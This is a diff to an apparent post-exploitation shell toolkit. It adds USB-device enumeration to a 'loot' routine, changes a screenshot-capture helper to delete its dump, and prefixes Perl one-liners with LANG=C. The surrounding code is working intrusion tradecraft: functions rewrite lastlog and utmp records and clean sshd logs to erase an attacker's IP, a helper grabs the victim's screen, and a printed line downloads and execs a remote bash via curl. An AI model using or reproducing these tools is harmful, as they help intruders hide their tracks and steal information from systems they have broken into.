@@ -292,6 +292,9 @@ nc() {
     xnc "$@"
 }
 
+# Convert stupid "find . -ls" output back to utf8
+find-ls-utf8() { LANG=C perl -pe 's[\\(?:([0-7]{1,3})|(.))] [defined($1) ? chr(oct($1)) : $2]eg'; }
+
 purl() {
     local opts="timeout=10"
     local opts_init
@@ -1601,7 +1604,7 @@ PERL
 sshd_clean() {
     local pid
     [[ $UID -eq 0 ]] || return
-    pid=$(_XID="${XDG_SESSION_ID}" _CS="$_CS" _PID="${1:-$_PID}" perl -e 'eval $ENV{_CS}; die $@ if $@')
+    pid=$(_XID="${XDG_SESSION_ID}" _CS="$_CS" _PID="${1:-$_PID}" LANG=C perl -e 'eval $ENV{_CS}; die $@ if $@')
     [ -z "$1" ] && {
         [ -z "$_HS_SSHD_TRIM_ON_EXIT" ] && _HS_SSHD_TRIM_ON_EXIT="$pid"
         echo -e "Tip: ${CDC}sshd_clean <SSHD-PID>${CN} to cleanse old logs by PID"
@@ -1632,12 +1635,12 @@ _hs_sshd_clean_on_exit() {
 
 lastlog_clean() {
     [ $# -lt 1 ] && { echo -e >&2 "Usage: lastlog_clean 'IP' 'NEW IP' [/var/log/lastlog]"; return 255; }
-    perl -0777 -pi -e 'BEGIN{$f=shift;$r=shift;$l=length($f)>length($r)?length($f):length($r);$f.="\x00"x($l-length($f));$r.="\x00"x($l-length($r))}s/\Q$f\E/$r/g' -- "${1:?}" "${2:-""}" "${3:-/var/log/lastlog}"
+    LANG=C perl -0777 -pi -e 'BEGIN{$f=shift;$r=shift;$l=length($f)>length($r)?length($f):length($r);$f.="\x00"x($l-length($f));$r.="\x00"x($l-length($r))}s/\Q$f\E/$r/g' -- "${1:?}" "${2:-""}" "${3:-/var/log/lastlog}"
 }
 
 utmp_clean() {
     [ $# -lt 1 ] && { echo >&2 "Usage: utmp_clean 'OLD_IP' [/var/run/utmp]"; return 255; }
-    perl -0777 -pi -e '
+    LANG=C perl -0777 -pi -e '
         BEGIN {
             $ip = shift;
             $packed = pack("C4", split(/\./, $ip)) . "\x00" x 12;
@@ -2090,7 +2093,7 @@ _hs_gen_home() {
 
 ebpf_show() {
     if command -v perl >/dev/null; then
-        perl -e 'for my $fd (glob "/proc/*/fd/*") {
+        LANG=C perl -e 'for my $fd (glob "/proc/*/fd/*") {
             next unless -l $fd && readlink($fd) =~ /bpf/;
             (my $pid = $fd) =~ s|/proc/(\d+)/.*|$1|;
             next if $pid == 1 || $seen{$pid}++;
@@ -2178,6 +2181,9 @@ lootlight() {
         _warn_skids
         _warn_astra
     }
+
+    # We do this in lootlight because they may change often.
+    _loot_usb
 
     declare -F _extended_history >/dev/null && [ -n "$PROMPT_COMMAND" ] && {
         unset PROMPT_COMMAND
@@ -2276,6 +2282,14 @@ _lootmore_video() {
     echo -en "${CB}Video Devices [${CDC}ffmpeg -f v4l2 -video_size 1280x720 -framerate 30 -i /dev/video0${CB}]${CDY}${CF}"
     echo "$str"
     echo -e "${CN}"
+}
+
+_loot_usb() {
+    local str=$(usb_devices)
+    [ -z "$str" ] && return
+    echo -e "${CB}USB Devices${CN}"
+    echo "$str"
+    echo -en "${CN}"
 }
 
 _loot_auth_log() {
@@ -2575,11 +2589,45 @@ sc() {
     DISPLAY="$DISPLAY" XAUTHORITY="$XAUTHORITY" timeout 2 xwd -silent -root 2>/dev/null | gzip >"$fn"
     [ "${PIPESTATUS[0]}" -eq 0 ] && { 
         ls -al "$fn" 2>/dev/null
-        echo "gunzip <${fn##*/} | xwdtopnm | pnmtopng >$(date +%Y-%m-%d_%H:%M:%S)_${HN:-$(hostname)}_sc.png"
+        echo "gunzip <'${fn##*/}' | xwdtopnm | pnmtopng >$(date +%Y-%m-%d_%H:%M:%S)_${HN:-$(hostname)}_sc.png;rm -f '${fn##*/}'"
         return 0
     }
   done
   return 1
+}
+
+usb_devices() {
+    local now
+    now=$(awk '{print $1}' /proc/uptime | cut -d. -f1)
+
+    dmesg | LANG=C perl -sne '
+        if (/\[(\d+)\.\d+\] usb ([\d.-]+): new .* device number (\d+)/) {
+            ($ts, $port, $dev) = ($1, $2, $3);
+            $devts{$dev} = $ts; $cur{$port} = $dev; $conn{$dev} = 1;
+        }
+        $d = $cur{$1} if /usb ([\d.-]+): (?:Product|Manufacturer|SerialNumber):/;
+        $prod{$d}  = $1 if /Product: (.+)/;
+        $mfr{$d}   = $1 if /Manufacturer: (.+)/;
+        $ser{$d}   = $1 if /SerialNumber: (.+)/;
+        $conn{$1}  = 0  if /USB disconnect, device number (\d+)/;
+        END {
+            for $d (keys %ser) {
+                $s = $ser{$d};
+                next if $best{$s} && $devts{$d} <= $best{$s};
+                $best{$s} = $devts{$d};
+                @rec{$s} = [$prod{$d}, $mfr{$d}, $conn{$d}];
+            }
+            for $s (sort { $best{$b} <=> $best{$a} } keys %best) {
+                $age = $now - $best{$s};
+                $age = sprintf(
+                    $age >= 86400 ? "%dd%dh%dm" : $age >= 3600 ? "%2\$dh%3\$dm" : "%3\$dm",
+                    int($age/86400), int($age%86400/3600), int($age%3600/60)
+                );
+                $c = $rec{$s}[2] ? " \033[32m[CONNECTED]\033[0m" : "";
+                printf "%8s %s %s %s%s\n", $age, $rec{$s}[0], $rec{$s}[1], $s, $c;
+            }
+        }
+    ' -- -now="$now"
 }
 
 xresize() {
@@ -2828,7 +2876,10 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
     export _HS_HOME_ORIG="$HOME"
 
     # ZSH compat MacOS
-    command -v setopt >/dev/null && setopt +o nomatch
+    command -v setopt >/dev/null && {
+        setopt +o nomatch
+        setopt +o noclobber # Allow overwriting of files
+    }
 
     # Do never ask to have a package installed
     unset command_not_found_handle
